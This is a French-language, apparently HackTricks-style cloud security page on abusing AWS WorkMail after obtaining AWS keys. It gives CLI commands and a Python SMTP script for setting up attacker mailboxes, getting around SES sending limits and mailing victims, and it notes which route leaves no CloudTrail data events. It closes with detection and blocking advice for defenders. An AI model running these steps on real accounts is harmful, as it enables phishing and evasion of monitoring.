# AWS - WorkMail Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Abuser WorkMail pour contourner le sandbox de SES

Même si SES est bloqué dans le **sandbox** (destinataires vérifiés uniquement, ~200 msgs/24h, 1 msg/s), WorkMail n'a pas de restriction équivalente. Un attaquant disposant de clés à long terme peut déployer une infra mail jetable et commencer à envoyer immédiatement :

1. **Créer une organisation WorkMail (limitée par région)**
```bash
aws workmail create-organization --region us-east-1 --alias temp-mail --directory-id <dir-id-if-reusing>
```
2. **Vérifier des domaines contrôlés par l'attaquant** (WorkMail invoque les APIs SES en tant que `workmail.amazonaws.com`):
```bash
aws ses verify-domain-identity --domain attacker-domain.com
aws ses verify-domain-dkim --domain attacker-domain.com
```
3. **Créer des utilisateurs de boîte mail** et les enregistrer :
```bash
aws workmail create-user --organization-id <org-id> --name marketing --display-name "Marketing"
aws workmail register-to-work-mail --organization-id <org-id> --entity-id <user-id> --email marketing@attacker-domain.com
```

Notes :
- Plafond par défaut de destinataires documenté par AWS : **100,000 destinataires externes/jour par org** (agrégés entre les utilisateurs).
- L'activité de vérification de domaine apparaîtra dans CloudTrail sous SES mais avec **`invokedBy`: `workmail.<region>.amazonaws.com`**, donc les événements de vérification SES peuvent appartenir à une configuration WorkMail plutôt qu'à des campagnes SES.
- Les utilisateurs de boîte mail WorkMail deviennent une **application-layer persistence** indépendante des utilisateurs IAM.

## Chemins d'envoi et lacunes de télémétrie

### Client Web (WorkMail UI)
- Les envois apparaissent comme des événements **`ses:SendRawEmail`** dans CloudTrail.
- `userIdentity.type` = `AWSService`, `invokedBy/sourceIPAddress/userAgent` = `workmail.<region>.amazonaws.com`, donc la **vraie IP client est masquée**.
- `requestParameters` leak toujours l'expéditeur (`source`, `fromArn`, `sourceArn`, configuration set) pour corréler avec les domaines/boîtes mail nouvellement vérifiés.

### SMTP (le plus furtif)
- Point de terminaison : `smtp.mail.<region>.awsapps.com:465` (SMTP over SSL) avec le mot de passe de la boîte mail.
- **Aucun événement de données CloudTrail** n'est généré pour la livraison SMTP, même lorsque les événements de données SES sont activés.
- Les points de détection idéaux sont le provisionnement d'org/domain/user et les ARNs d'identité SES référencés dans les événements `SendRawEmail` envoyés via le web.

<details>
<summary>Exemple d'envoi SMTP via WorkMail</summary>
```python
import smtplib
from email.message import EmailMessage

SMTP_SERVER = "smtp.mail.us-east-1.awsapps.com"
SMTP_PORT = 465
EMAIL_ADDRESS = "marketing@attacker-domain.com"
EMAIL_PASSWORD = "SuperSecretPassword!"

target = "victim@example.com"  # can be unverified/external
msg = EmailMessage()
msg["Subject"] = "WorkMail SMTP"
msg["From"] = EMAIL_ADDRESS
msg["To"] = target
msg.set_content("Delivered via WorkMail SMTP")

with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as smtp:
smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
smtp.send_message(msg)
```
</details>

## Considérations de détection

- Si WorkMail n'est pas nécessaire, bloquez-le via des **SCPs** (`workmail:*` deny) au niveau de l'organisation.
- Alerter lors du provisionnement : `workmail:CreateOrganization`, `workmail:CreateUser`, `workmail:RegisterToWorkMail`, et les vérifications SES avec `invokedBy=workmail.amazonaws.com` (`ses:VerifyDomainIdentity`, `ses:VerifyDomainDkim`).
- Surveillez les événements **`ses:SendRawEmail`** anormaux où les ARNs d'identité référencent de nouveaux domaines et où l'IP source/UA est égale à `workmail.<region>.amazonaws.com`.

## Références

- [Threat Actors Using AWS WorkMail in Phishing Campaigns](https://www.rapid7.com/blog/post/dr-threat-actors-aws-workmail-phishing-campaigns)
- [AWS WorkMail limits](https://docs.aws.amazon.com/workmail/latest/adminguide/limits.html)

{{#include ../../../../banners/hacktricks-training.md}}
